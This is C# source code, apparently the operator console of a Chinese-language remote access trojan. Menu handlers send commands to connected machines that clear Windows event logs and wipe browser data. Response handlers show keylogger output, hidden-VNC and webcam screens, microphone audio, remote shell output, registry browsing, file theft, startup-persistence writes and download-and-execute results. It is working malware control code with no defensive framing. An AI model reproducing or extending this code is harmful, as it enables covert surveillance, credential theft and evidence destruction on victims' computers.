                currentSession.Send(ePacketType.PACKET_UNINSTALL_REQUEST, new RequestUninstall());
            }
        }

        // ---- 清理日志 事件处理 ----
        private void onMenuClearAllLogs(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_CLEAR_LOG_REQUEST, new RequestClearLog { LogType = eClearLogType.All });
        }

        private void onMenuClearSystemLog(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_CLEAR_LOG_REQUEST, new RequestClearLog { LogType = eClearLogType.System });
        }

        private void onMenuClearSecurityLog(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_CLEAR_LOG_REQUEST, new RequestClearLog { LogType = eClearLogType.Security });
        }

        private void onMenuClearApplicationLog(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_CLEAR_LOG_REQUEST, new RequestClearLog { LogType = eClearLogType.Application });
        }

        // ---- 更改分组 ----
        private void onMenuChangeGroup(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            FrmRename frm = new FrmRename("");
            frm.Text = "更改分组";
            if (frm.ShowDialog() == DialogResult.OK)
            {
                // 更新树节点分组标签
                foreach (TreeNode node in InternetTreeNode.Nodes)
                {
                    var session = node.Tag as SocketSession;
                    if (session != null && session.SocketId == currentSession.SocketId)
                    {
                        node.ToolTipText = "分组: " + frm.NewName;
                        break;
                    }
                }
                doOutput("已更改分组为: " + frm.NewName);
            }
        }

        private void onMenuFilterHosts(object sender, EventArgs e)
        {
            FrmInputUrl frm = new FrmInputUrl();
            frm.Text = "请输入筛选关键词";
            if (frm.ShowDialog() != DialogResult.OK)
                return;

            hostFilterKeyword = string.IsNullOrWhiteSpace(frm.InputText)
                ? string.Empty
                : frm.InputText.Trim();
            RenderClientTree();
            doOutput(string.IsNullOrEmpty(hostFilterKeyword)
                ? "已清除主机筛选"
                : "已筛选主机: " + hostFilterKeyword);
        }

        // ---- 清除浏览器 事件处理 ----
        private void onMenuClearIE(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_CLEAR_BROWSER_DATA_REQUEST, new RequestClearBrowserData { BrowserType = eBrowserType.IE });
        }

        private void onMenuClearChrome(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_CLEAR_BROWSER_DATA_REQUEST, new RequestClearBrowserData { BrowserType = eBrowserType.Chrome });
        }

        private void onMenuClearSkype(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_CLEAR_BROWSER_DATA_REQUEST, new RequestClearBrowserData { BrowserType = eBrowserType.Skype });
        }

        private void onMenuClearFirefox(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_CLEAR_BROWSER_DATA_REQUEST, new RequestClearBrowserData { BrowserType = eBrowserType.Firefox });
        }

        private void onMenuClear360(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_CLEAR_BROWSER_DATA_REQUEST, new RequestClearBrowserData { BrowserType = eBrowserType.Browser360 });
        }

        private void onMenuClearQQ(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_CLEAR_BROWSER_DATA_REQUEST, new RequestClearBrowserData { BrowserType = eBrowserType.QQ });
        }

        private void onMenuClearSogou(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_CLEAR_BROWSER_DATA_REQUEST, new RequestClearBrowserData { BrowserType = eBrowserType.Sogou });
        }

        // ---- 选择操作 ----
        private void onMenuSelectAll(object sender, EventArgs e)
        {
            foreach (TreeNode node in InternetTreeNode.Nodes)
            {
                node.Checked = true;
            }
        }

        private void onMenuDeselectAll(object sender, EventArgs e)
        {
            foreach (TreeNode node in InternetTreeNode.Nodes)
            {
                node.Checked = false;
            }
        }

        #endregion

        private void initSkinMenus()
        {
            this.ToolStripMenuItemSkins.DropDownItems.Clear();
            RSCApplication.lstSkins = RSCApplication.GetAllSkinFiles();
            if (RSCApplication.lstSkins.Count > 0)
            {
                Dictionary<string, ToolStripMenuItem> skinGroups = new Dictionary<string, ToolStripMenuItem>(StringComparer.OrdinalIgnoreCase);
                int iSkinCount = RSCApplication.lstSkins.Count;
                for (int i = 0; i < iSkinCount; i++)
                {
                    string sSkinFile = RSCApplication.lstSkins[i];
                    string familyKey = GetSkinFamilyKey(sSkinFile);
                    ToolStripMenuItem groupMenu;
                    if (!skinGroups.TryGetValue(familyKey, out groupMenu))
                    {
                        groupMenu = new ToolStripMenuItem(GetSkinFamilyDisplayName(familyKey));
                        skinGroups.Add(familyKey, groupMenu);
                        this.ToolStripMenuItemSkins.DropDownItems.Add(groupMenu);
                    }

                    string sSkinName = GetSkinVariantDisplayName(sSkinFile, familyKey);
                    ToolStripMenuItem menuSkin = new ToolStripMenuItem(sSkinName, null, (o, e) =>
                        {
                            ToolStripMenuItem m = o as ToolStripMenuItem;
                            string sFile = m.Tag as string;
                            actChangeSkin(sFile);
                        });
                    menuSkin.Tag = sSkinFile;
                    groupMenu.DropDownItems.Add(menuSkin);
                }
            }
            var tools = RSCApplication.GetAllTools();
            if (tools.Count > 0)
            {
                for (int i = 0; i < tools.Count; i++)
                {
                    string tool = tools[i];
                    string menuText = System.IO.Path.GetFileNameWithoutExtension(tool);
                    Bitmap bmp = System.Drawing.Icon.ExtractAssociatedIcon(tool).ToBitmap();
                    ToolStripMenuItem menuItem = new ToolStripMenuItem(menuText, bmp, (o, e) =>
                    {
                        ToolStripMenuItem m = o as ToolStripMenuItem;
                        string sFile = m.Tag as string;
                        ProcessUtil.Run(sFile, "", false);
                    });
                    menuItem.Tag = tool;
                    this.ToolStripMenuItemTools.DropDownItems.Add(menuItem);
                }
            }

            Dictionary<ePathType, string> paths = new Dictionary<ePathType,string>();
            paths.Add(ePathType.APP_DIR, "根目录");
            paths.Add(ePathType.AVATAR_DIR,"头像目录");
            paths.Add(ePathType.SKINS_DIR,"皮肤目录");
            paths.Add(ePathType.TOOL_DIR,"工具目录");
            foreach (var pair in paths)
	        {
                string path = RSCApplication.GetPath(pair.Key);
                string menuText = pair.Value;
                ToolStripMenuItem menuItem = new ToolStripMenuItem(menuText, null, (o, e) =>
                {
                    ToolStripMenuItem m = o as ToolStripMenuItem;
                    string sFile = m.Tag as string;
                    ProcessUtil.RunByCmdStart("explorer.exe", sFile, true);
                    //ProcessUtil.Run("explorer.exe", sFile, false);
                });
                menuItem.Tag = path;
                this.ToolStripMenuItemUsualFolders.DropDownItems.Add(menuItem);
	        }
        }

        private void initIcons()
        {
            string sFileName = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\shell32.dll";
            int iIconCount = Win32API.ExtractIconEx(sFileName, -1, null, null, 0);
            IntPtr[] pLargeIcons = new IntPtr[iIconCount];
            IntPtr[] pSmallIcons = new IntPtr[iIconCount];
            Win32API.ExtractIconEx(sFileName, 0, pLargeIcons, pSmallIcons, iIconCount);
            for (int i = 0; i < iIconCount; i++)
			{
                this.imageList1.Images.Add(Icon.FromHandle(pLargeIcons[i]));
			}

            Dictionary<string,View> viewDic = new Dictionary<string,View>();
            viewDic.Add("大图标", View.LargeIcon);
            viewDic.Add("详情", View.Details);
            viewDic.Add("小图标", View.SmallIcon);
            viewDic.Add("列表", View.List);
            viewDic.Add("平铺", View.Tile);
            this.toolStripSplitButton1.Click += (o, args) => this.toolStripSplitButton1.ShowDropDown();
            foreach (var viewItem in viewDic)
	        {
                ToolStripItem tsi = this.toolStripSplitButton1.DropDownItems.Add(viewItem.Key, null, (o, args) =>
                    {
                        ToolStripItem i = o as ToolStripItem;
                        View v = (View)i.Tag;
                        this.listView1.View = v;
                    });
                tsi.Tag = viewItem.Value;
	        }

            var avatars = RSCApplication.GetAllAvatarFiles();
            for (int i = 0; i < avatars.Count; i++)
            {
                string avatarPath = avatars[i];
                string avatarFileName = System.IO.Path.GetFileName(avatarPath);
                this.imageList2.Images.Add(avatarFileName, Image.FromFile(avatarPath));
            }
        }

        private static string GetSkinFamilyKey(string skinFile)
        {
            string dir = System.IO.Path.GetDirectoryName(skinFile);
            if (string.IsNullOrEmpty(dir))
                return System.IO.Path.GetFileNameWithoutExtension(skinFile);
            return System.IO.Path.GetFileName(dir);
        }

        private static string GetSkinFamilyDisplayName(string familyKey)
        {
            string key = (familyKey ?? "").ToLowerInvariant();
            switch (key)
            {
                case "carlmness":
                case "calmness":
                    return "宁静";
                case "deep":
                    return "深色";
                case "diamond":
                    return "钻石";
                case "eighteen":
                    return "十八号";
                case "emerald":
                    return "翡翠";
                case "glass":
                    return "玻璃";
                case "longhorn":
                    return "长角风格";
                case "macos":
                    return "苹果风格";
                case "midsummer":
                    return "仲夏";
                case "mp10":
                    return "媒体播放器10";
                case "msn":
                    return "MSN风格";
                case "office2007":
                    return "Office 2007";
                case "one":
                    return "简约";
                case "page":
                    return "页面";
                case "realone":
                    return "RealOne风格";
                case "silver":
                    return "银色";
                case "sports":
                    return "运动";
                case "steel":
                    return "钢铁";
                case "vista1":
                    return "Vista 一";
                case "vista2":
                    return "Vista 二";
                case "warm":
                    return "暖色";
                case "wave":
                    return "波浪";
                case "winxp":
                    return "Windows XP";
                default:
                    return familyKey;
            }
        }

        private static string GetSkinVariantDisplayName(string skinFile, string familyKey)
        {
            string name = System.IO.Path.GetFileNameWithoutExtension(skinFile);
            string variant = RemoveSkinFamilyPrefix(name, familyKey);
            if (string.IsNullOrEmpty(variant))
                return "默认";

            variant = variant.Trim('_', '-', ' ');
            if (variant.StartsWith("color", StringComparison.OrdinalIgnoreCase))
            {
                string number = variant.Substring("color".Length);
                return "颜色" + ToChineseNumber(number);
            }
            if (variant.StartsWith("_color", StringComparison.OrdinalIgnoreCase))
            {
                string number = variant.Substring("_color".Length);
                return "颜色" + ToChineseNumber(number);
            }
            return TranslateSkinColor(variant);
        }

        private static string RemoveSkinFamilyPrefix(string name, string familyKey)
        {
            if (string.IsNullOrEmpty(name))
                return "";

            string result = name;
            if (!string.IsNullOrEmpty(familyKey) && result.StartsWith(familyKey, StringComparison.OrdinalIgnoreCase))
            {
                result = result.Substring(familyKey.Length);
            }
            else if (result.StartsWith("XP", StringComparison.OrdinalIgnoreCase))
            {
                result = result.Substring(2);
            }

            if (result.Equals(name, StringComparison.OrdinalIgnoreCase) &&
                !string.IsNullOrEmpty(familyKey) &&
                name.Equals(familyKey, StringComparison.OrdinalIgnoreCase))
            {
                return "";
            }

            return result;
        }

        private static string TranslateSkinColor(string value)
        {
            string key = (value ?? "").Trim('_', '-', ' ').ToLowerInvariant();
            switch (key)
            {
                case "":
                    return "默认";
                case "blue":
                    return "蓝色";
                case "green":
                    return "绿色";
                case "orange":
                    return "橙色";
                case "olive":
                    return "橄榄色";
                case "purple":
                    return "紫色";
                case "red":
                    return "红色";
                case "cyan":
                    return "青色";
                case "brown":
                    return "棕色";
                case "black":
                    return "黑色";
                case "maroon":
                    return "栗色";
                case "mulberry":
                    return "桑葚色";
                case "pink":
                    return "粉色";
                case "silver":
                    return "银色";
                default:
                    if (key.StartsWith("color"))
                        return "颜色" + ToChineseNumber(key.Substring("color".Length));
                    return value;
            }
        }

        private static string ToChineseNumber(string number)
        {
            switch ((number ?? "").Trim())
            {
                case "1":
                    return "一";
                case "2":
                    return "二";
                case "3":
                    return "三";
                case "4":
                    return "四";
                case "5":
                    return "五";
                case "6":
                    return "六";
                case "7":
                    return "七";
                default:
                    return number;
            }
        }

        private void initServerEvents()
        {
            RSCApplication.oRemoteControlServer = new RemoteControlServer();
            RSCApplication.oRemoteControlServer.ClientConnected += oRemoteControlServer_ClientConnected;
            RSCApplication.oRemoteControlServer.ClientDisconnected += oRemoteControlServer_ClientDisconnected;
            RSCApplication.oRemoteControlServer.PacketReceived += oRemoteControlServer_PacketReceived;
        }

        void oRemoteControlServer_PacketReceived(object sender, PacketReceivedEventArgs e)
        {
            //Console.WriteLine(e.PacketType.ToString());
            ResponseBase rb = e.Obj as ResponseBase;
            if (rb != null && rb.Result == false)
            {
                Logger.Debug(e.Session.SocketId + " Error:" + rb.Message + "\r\n" + rb.Detail);
                doOutput(rb.Message);
                return;
            }

            if (e.PacketType == ePacketType.PACKET_CLIENT_CLOSE_RESPONSE)
            {
                e.Session.Close();
            }
            else if (e.PacketType == ePacketType.PACKET_GET_HOST_NAME_RESPONSE)
            {
                var resp = e.Obj as ResponseGetHostName;
                string hostName = resp.HostName;
                e.Session.SetHostName(hostName);
                e.Session.SetAppPath(resp.AppPath);
                e.Session.SetOnlineAvatar(resp.OnlineAvatar);
                if (this.currentSession != null &&
                    this.currentSession.SocketId == e.Session.SocketId)
                {
                    // 更新主机名
                    this.Invoke(new Action(() =>
                    {
                        UpdateSelectedClientInfo(e.Session);
                    }));
                }
                this.Invoke(new Action(() =>
                {
                    // 修改节点图标
                    TreeNode node = FindClientNode(e.Session);
                    if (node != null)
                    {
                        node.Text = string.Format("{0}({1})", e.Session.GetSocketIPById(), e.Session.HostName);
                        if (this.treeView1.ImageList.Images.ContainsKey(e.Session.OnlineAvatar))
                        {
                            node.ImageKey = e.Session.OnlineAvatar;
                            node.SelectedImageKey = e.Session.OnlineAvatar; 
                        }
                    }
                }));
            }

            // 过滤非当前会话
            if (this.currentSession == null || e.Session.SocketId != this.currentSession.SocketId)
                return;

            if (e.PacketType == ePacketType.PACKET_GET_DRIVES_RESPONSE)
            {
                ResponseGetDrives resp = e.Obj as ResponseGetDrives;
                this.UpdateUI(() =>
                {
                    SetFileListColumnsForDrives();
                    this.listView1.Items.Clear();
                    this.listView1.Tag = null;
                    for (int i = 0; i < resp.drives.Count; i++)
                    {
                        string drive = resp.drives[i];
                        ListViewItem item = new ListViewItem(new string[] { drive, "", "", "" }, 7);
                        ListViewItemFileOrDirTag tag = new ListViewItemFileOrDirTag();
                        tag.IsFile = false;
                        tag.Path = drive;
                        item.Tag = tag;
                        this.listView1.Items.Add(item);
                    }

                });
            }
            else if (e.PacketType == ePacketType.PACKET_GET_DRIVES_EX_RESPONSE)
            {
                ResponseGetDrivesEx resp = e.Obj as ResponseGetDrivesEx;
                if (resp == null || resp.Drives == null)
                    return;

                this.UpdateUI(() =>
                {
                    SetFileListColumnsForDrives();
                    this.listView1.Items.Clear();
                    this.listView1.Tag = null;
                    for (int i = 0; i < resp.Drives.Count; i++)
                    {
                        DriveInfoEx drive = resp.Drives[i];
                        string displayName = string.IsNullOrEmpty(drive.VolumeLabel)
                            ? drive.Name
                            : string.Format("{0} ({1})", drive.Name, drive.VolumeLabel);
                        ListViewItem item = new ListViewItem(
                            new string[]
                            {
                                displayName,
                                drive.DriveType,
                                GetDriveSizeDesc(drive.TotalSize),
                                GetDriveSizeDesc(drive.FreeSpace)
                            }, 7);
                        ListViewItemFileOrDirTag tag = new ListViewItemFileOrDirTag();
                        tag.IsFile = false;
                        tag.Path = drive.Name;
                        item.Tag = tag;
                        this.listView1.Items.Add(item);
                    }
                });
            }
            else if (e.PacketType == ePacketType.PACKET_GET_SUBFILES_OR_DIRS_RESPONSE)
            {
                ResponseGetSubFilesOrDirs resp = e.Obj as ResponseGetSubFilesOrDirs;
                this.UpdateUI(() =>
                    {
                        SetFileListColumnsForFiles();
                        this.listView1.Items.Clear();
                        for (int i = 0; i < resp.dirs.Count; i++)
                        {
                            var dirObj = resp.dirs[i];
                            string path = dirObj.DirPath;
                            string itemText = System.IO.Path.GetFileName(path);
                            ListViewItem item = new ListViewItem(new string[] { itemText, "", dirObj.LastWriteTime.ToString("yyyy/MM/dd HH:mm:ss"),"<文件夹>" }, 3);
                            ListViewItemFileOrDirTag tag = new ListViewItemFileOrDirTag();
                            tag.IsFile = false;
                            tag.Path = path;
                            item.Tag = tag;
                            this.listView1.Items.Add(item);
                        }
                        for (int i = 0; i < resp.files.Count; i++)
                        {
                            var fileObj = resp.files[i];
                            string path = fileObj.FilePath;
                            string itemText = System.IO.Path.GetFileName(path);
                            string extension = System.IO.Path.GetExtension(path).ToLower();
                            if (!this.imageList1.Images.ContainsKey(extension))
                            {
                                this.imageList1.Images.Add(extension, CommonUtil.GetIcon(extension, true));
                            }
                            ListViewItem item = new ListViewItem(new string[] { itemText, GetFileSizeDesc(fileObj.Size), fileObj.LastWriteTime.ToString("yyyy/MM/dd HH:mm:ss"), "<文件>" }, extension);
                            ListViewItemFileOrDirTag tag = new ListViewItemFileOrDirTag();
                            tag.IsFile = true;
                            tag.Path = path;
                            item.Tag = tag;
                            this.listView1.Items.Add(item);
                        }
                    });
            }
            else if (e.PacketType == ePacketType.PACKET_START_CAPTURE_SCREEN_RESPONSE)
            {
                if (sessionScreenHandlers.ContainsKey(e.Session.SocketId))
                {
                    var screenHandle = sessionScreenHandlers[e.Session.SocketId];
                    screenHandle(e.Obj as ResponseStartGetScreen);
                }
            }
            else if (e.PacketType == ePacketType.PACKET_HVNC_SCREEN_RESPONSE)
            {
                if (sessionHVNCScreenHandlers.ContainsKey(e.Session.SocketId))
                {
                    var screenHandle = sessionHVNCScreenHandlers[e.Session.SocketId];
                    screenHandle(e.Obj as ResponseHVNCScreen);
                }
            }
            else if (e.PacketType == ePacketType.PACKET_HVNC_START_RESPONSE)
            {
                if (sessionHVNCStartHandlers.ContainsKey(e.Session.SocketId))
                {
                    var startHandle = sessionHVNCStartHandlers[e.Session.SocketId];
                    startHandle(e.Obj as ResponseHVNCStart);
                }
            }
            else if (e.PacketType == ePacketType.PACKET_START_CAPTURE_VIDEO_RESPONSE)
            {
                if (sessionVideoHandlers.ContainsKey(e.Session.SocketId))
                {
                    var videoHandle = sessionVideoHandlers[e.Session.SocketId];
                    videoHandle(e.Obj as ResponseStartCaptureVideo);
                }
            }
            else if (e.PacketType == ePacketType.PACKET_CREATE_FILE_OR_DIR_RESPONSE)
            {
                ResponseCreateFileOrDir resp = e.Obj as ResponseCreateFileOrDir;
                if (resp.Result == false)
                {
                    doOutput(resp.Path + "创建失败，" + resp.Path);
                }

                string path = resp.Path;
                string itemText = System.IO.Path.GetFileName(path);
                ListViewItem item = new ListViewItem(string.Concat(new object[] { itemText, "", "" }), resp.PathType == Protocals.ePathType.File ? 152 : 3);
                ListViewItemFileOrDirTag tag = new ListViewItemFileOrDirTag();
                tag.IsFile = resp.PathType == Protocals.ePathType.File;
                tag.Path = path;
                item.Tag = tag;
                this.listView1.Items.Add(item);
            }
            else if (e.PacketType == ePacketType.PACKET_DELETE_FILE_OR_DIR_RESPONSE)
            {
                ResponseDeleteFileOrDir resp = e.Obj as ResponseDeleteFileOrDir;
                if (resp.Result == false)
                {
                    doOutput(resp.Path + "删除失败，" + resp.Path);
                }

                for (int i = this.listView1.Items.Count - 1; i >= 0; i--)
                {
                    var tag = this.listView1.Items[i].Tag as ListViewItemFileOrDirTag;
                    if (resp.Path == tag.Path)
                    {
                        this.listView1.Items.RemoveAt(i);
                    }
                }
            }
            else if (e.PacketType == ePacketType.PACKET_START_DOWNLOAD_HEADER_RESPONSE)
            {
                ResponseStartDownloadHeader downloadHeader = e.Obj as ResponseStartDownloadHeader;

                string fileName = System.IO.Path.GetFileName(downloadHeader.Path);
                this.DownloadHeader = downloadHeader;

                // 处理资源释放
                if (this.downloadFileStream != null)
                {
                    this.downloadFileStream.Close();
                    this.downloadFileStream = null;
                }
                this.recvSize = 0;
                this.UpdateDownloadProgressAction = null;

                new Thread(() =>
                {
                    var frm = new FrmDownload(() =>
                    {
                        // 处理资源释放
                        if (this.downloadFileStream != null)
                        {
                            this.downloadFileStream.Close();
                            this.downloadFileStream = null;
                        }
                        this.recvSize = 0;
                        this.UpdateDownloadProgressAction = null;

                        // 发送终止下载请求
                        this.currentSession.Send(ePacketType.PACKET_STOP_DOWNLOAD_REQUEST, null);
                    }, downloadHeader.Path, downloadHeader.SavePath, downloadHeader.FileSize);
                    this.DownloadWindow = frm;
                    this.UpdateDownloadProgressAction = frm.UpdateProgress;
                    frm.ShowDialog();
                }) { IsBackground = true }.Start();
            }
            else if (e.PacketType == ePacketType.PACKET_START_DOWNLOAD_RESPONSE)
            {
                ResponseStartDownload resp = e.Obj as ResponseStartDownload;
                try
                {
                    string localFull = this.DownloadHeader.SavePath;
                    if (!System.IO.File.Exists(localFull))
                    {
                        System.IO.File.Create(localFull).Close();
                    }
                    byte[] data = resp.Data;
                    if (downloadFileStream == null)
                    {
                        downloadFileStream = new FileStream(localFull, FileMode.Open, FileAccess.Write);
                    }
                    downloadFileStream.Write(data, 0, data.Length);
                    this.recvSize += data.Length;

                    // 显示进度
                    if (this.DownloadWindow!=null)
                    {
                        this.DownloadWindow.UpdateProgress(this.recvSize);
                    }

                    // 下载完成
                    if (this.recvSize == this.DownloadHeader.FileSize)
                    {
                        this.DownloadWindow.Close();

                        // 处理资源释放
                        if (this.downloadFileStream != null)
                        {
                            this.downloadFileStream.Close();
                            this.downloadFileStream = null;
                        }
                        this.recvSize = 0;
                        this.UpdateDownloadProgressAction = null;
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
            else if (e.PacketType == ePacketType.PACKET_COMMAND_RESPONSE)
            {
                ResponseCommand resp = e.Obj as ResponseCommand;
                if(resp.Result ==false)
                    return;

                this.textBoxCommandResponse.AppendText(resp.CommandResponse + "\r\n");
            }
            else if (e.PacketType == ePacketType.PACKET_GET_PROCESSES_RESPONSE)
            {
                ResponseGetProcesses resp = e.Obj as ResponseGetProcesses;

                new Thread(() => 
                {
                    UpdateProcessListView(resp);

                }) { IsBackground=true }.Start();
            }
            else if (e.PacketType == ePacketType.PACKET_COPY_FILE_OR_DIR_RESPONSE)
            {
                var resp = e.Obj as ResponseCopyFile;
                doOutput("复制" + resp.SourceFile + "成功!");
            }
            else if (e.PacketType == ePacketType.PACKET_MOVE_FILE_OR_DIR_RESPONSE)
            {
                var resp = e.Obj as ResponseMoveFile;
                doOutput("移动" + resp.SourceFile + "成功!");
            }
            else if (e.PacketType == ePacketType.PACKET_VIEW_REGISTRY_KEY_RESPONSE)
            {
                // 查看注册表项
                var resp = e.Obj as ResponseViewRegistryKey;
                this.UpdateUI(() =>
                {
                    try
                    {
                        // 清除右侧value值列表
                        this.listView2.Items.Clear();
                        if (resp.KeyNames != null)
                        {
                            TreeView tv = this.treeView2;
                            // 查找根节点
                            TreeNode rootNode = null;
                            for (int j = 0; j < tv.Nodes[0].Nodes.Count; j++)
                            {
                                TreeNode node = tv.Nodes[0].Nodes[j];
                                string str = node.Tag.ToString();
                                eRegistryHive erh = (eRegistryHive)Enum.Parse(typeof(eRegistryHive), str);
                                if (erh == resp.KeyRoot)
                                {
                                    rootNode = node;
                                    break;
                                }
                            }
                            if (rootNode == null)
                            {
                                doOutput("未找到Registry根节点");
                                return;
                            }
                            TreeNode curNode = rootNode;
                            if (resp.KeyPath != null)
                            {
                                // 查找目标的节点
                                string[] keyNames = resp.KeyPath.Split("\\".ToCharArray(), StringSplitOptions.RemoveEmptyEntries);
                                for (int i = 0; i < keyNames.Length; i++)
                                {
                                    var keyName = keyNames[i];
                                    var found = false;
                                    for (int k = 0; k < curNode.Nodes.Count; k++)
                                    {
                                        var node = curNode.Nodes[k];
                                        if (node.Text == keyName)
                                        {
                                            found = true;
                                            curNode = node;
                                            break;
                                        }
                                    }
                                    if (!found)
                                    {
                                        TreeNode node = new TreeNode(keyName, 0, 0);
                                        List<string> curKeys = new List<string>();
                                        for (int ii = 0; ii <= i; ii++)
                                        {
                                            curKeys.Add(keyNames[ii]);
                                        }
                                        node.Tag = new RequestViewRegistryKey() {
                                            KeyRoot = resp.KeyRoot,
                                            KeyPath = string.Join("\\",curKeys)
                                        };
                                        curNode.Nodes.Add(node);
                                        curNode = node;
                                    }
                                }
                            }
                            // 清除目标节点的子节点
                            curNode.Nodes.Clear();
                            // 重新添加目标节点的子节点
                            for (int i = 0; i < resp.KeyNames.Length; i++)
                            {
                                string keyName = resp.KeyNames[i];
                                TreeNode node = new TreeNode(keyName, 0, 0);
                                string newKeyPath = resp.KeyPath + @"\" + keyName;
                                newKeyPath = newKeyPath.TrimStart('\\');
                                node.Tag = new RequestViewRegistryKey(){
                                    KeyRoot = resp.KeyRoot,
                                    KeyPath = newKeyPath
                                };
                                curNode.Nodes.Add(node);
                            }
                            curNode.Expand();
                            tv.SelectedNode = curNode;
                            this.listView2.Tag = curNode.Tag;

                            this.textBoxRegistryPath.Text = "计算机\\" + resp.KeyRoot + "\\" + resp.KeyPath;
                        }
                        if (resp.ValueNames != null)
                        {
                            // 添加右侧value值列表
                            int valueNameLen = resp.ValueNames.Length;
                            for (int i = 0; i < valueNameLen; i++)
                            {
                                ListViewItem item = new ListViewItem(new string[]{
                                    resp.ValueNames[i],
                                    resp.ValueKinds[i].ToString(),
                                    resp.Values[i].ToString()
                                },resp.ValueKinds[i].ToString());
                                this.listView2.Items.Add(item);
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Logger.Error("", ex);
                    }
                });
            }
            else if (e.PacketType == ePacketType.PACKET_START_CAPTURE_AUDIO_RESPONSE)
            {
                var resp = e.Obj as ResponseStartCaptureAudio;
                if (_waveOut != null)
                {
                    byte[] decodedData = G711.Decode_aLaw(resp.AudioData, 0, resp.AudioData.Length);
                    _waveOut.Play(decodedData, 0, decodedData.Length);
                }
            }
            else if (e.PacketType == ePacketType.PACKET_SERVICE_MANAGER_RESPONSE)
            {
                var resp = e.Obj as ResponseServiceManager;
                if (resp == null) return;
                if (resp.Services != null)
                {
                    this.UpdateUI(() =>
                    {
                        this.textBoxCommandResponse.AppendText("=== 服务列表 ===\r\n");
                        foreach (var svc in resp.Services)
                        {
                            this.textBoxCommandResponse.AppendText(
                                string.Format("{0} | {1} | {2}\r\n",
                                    svc.ServiceName, svc.DisplayName, svc.Status));
                        }
                        this.textBoxCommandResponse.AppendText("=== 共 " + resp.Services.Count + " 个服务 ===\r\n");
                    });
                }
                else
                {
                    doOutput(resp.Message);
                    if (resp.Result && currentSession != null)
                    {
                        currentSession.Send(ePacketType.PACKET_SERVICE_MANAGER_REQUEST, new RequestServiceManager { Action = eServiceAction.List });
                    }
                }
            }
            else if (e.PacketType == ePacketType.PACKET_REMOTE_CHAT_RESPONSE)
            {
                var resp = e.Obj as ResponseRemoteChat;
                if (resp == null) return;
                this.UpdateUI(() =>
                {
                    this.textBoxCommandResponse.AppendText("=== 远程聊天回复 ===\r\n");
                    this.textBoxCommandResponse.AppendText("发送: " + resp.RequestMessage + "\r\n");
                    this.textBoxCommandResponse.AppendText("回复: " + resp.Reply + "\r\n");
                });
            }
            else if (e.PacketType == ePacketType.PACKET_FIND_WINDOW_RESPONSE)
            {
                var resp = e.Obj as ResponseFindWindow;
                if (resp == null || resp.Windows == null) return;
                this.UpdateUI(() =>
                {
                    this.textBoxCommandResponse.AppendText("=== 窗口查找结果 ===\r\n");
                    foreach (var window in resp.Windows)
                    {
                        this.textBoxCommandResponse.AppendText(
                            string.Format("{0} | PID:{1} | {2} | HWND:{3}\r\n",
                                window.Title, window.ProcessId, window.ProcessName, window.Handle));
                    }
                    this.textBoxCommandResponse.AppendText("=== 共 " + resp.Windows.Count + " 个窗口 ===\r\n");
                });
            }
            else if (e.PacketType == ePacketType.PACKET_KEYLOGGER_RESPONSE)
            {
                var resp = e.Obj as ResponseKeylogger;
                if (resp == null || string.IsNullOrEmpty(resp.LogData)) return;
                this.UpdateUI(() =>
                {
                    this.textBoxCommandResponse.AppendText(
                        DateTime.Now.ToString("HH:mm:ss") + " [Keylog] " + resp.LogData + "\r\n");
                });
            }
            else if (e.PacketType == ePacketType.PACKET_CLEAR_LOG_RESPONSE)
            {
                var resp = e.Obj as ResponseClearLog;
                if (resp != null)
                    doOutput(resp.Result ? "清除日志成功" : "清除日志失败: " + resp.Message);
            }
            else if (e.PacketType == ePacketType.PACKET_CLEAR_BROWSER_DATA_RESPONSE)
            {
                var resp = e.Obj as ResponseClearBrowserData;
                if (resp != null)
                    doOutput(resp.Result ? "清除浏览器数据成功" : "清除浏览器数据失败: " + resp.Message);
            }
            else if (e.PacketType == ePacketType.PACKET_RUN_FILE_RESPONSE)
            {
                var resp = e.Obj as ResponseRunFile;
                if (resp != null)
                    doOutput(resp.Result ? "运行文件成功" : "运行文件失败: " + resp.Message);
            }
            else if (e.PacketType == ePacketType.PACKET_COMPRESS_FILE_RESPONSE)
            {
                var resp = e.Obj as ResponseCompressFile;
                if (resp != null)
                {
                    doOutput(resp.Result ? "压缩文件成功" : "压缩文件失败: " + resp.Message);
                    if (resp.Result)
                        RefreshCurrentFileView();
                }
            }
            else if (e.PacketType == ePacketType.PACKET_DECOMPRESS_FILE_RESPONSE)
            {
                var resp = e.Obj as ResponseDecompressFile;
                if (resp != null)
                {
                    doOutput(resp.Result ? "解压文件成功" : "解压文件失败: " + resp.Message);
                    if (resp.Result)
                        RefreshCurrentFileView();
                }
            }
            else if (e.PacketType == ePacketType.PACKET_WRITE_STARTUP_RESPONSE)
            {
                var resp = e.Obj as ResponseWriteStartup;
                if (resp != null)
                    doOutput(resp.Result ? "写入启动项成功" : "写入启动项失败: " + resp.Message);
            }
            else if (e.PacketType == ePacketType.PACKET_DOWNLOAD_EXEC_RESPONSE)
            {
                var resp = e.Obj as ResponseDownloadExec;
                if (resp != null)
                    doOutput(resp.Result ? "下载执行成功" : "下载执行失败: " + resp.Message);
            }
            else if (e.PacketType == ePacketType.PACKET_CHANGE_CONFIG_RESPONSE)
            {
                var resp = e.Obj as ResponseChangeConfig;
                if (resp != null)
                {
                    doOutput(resp.Result ? "更改配置成功: " + resp.Message : "更改配置失败: " + resp.Message);
                }
            }
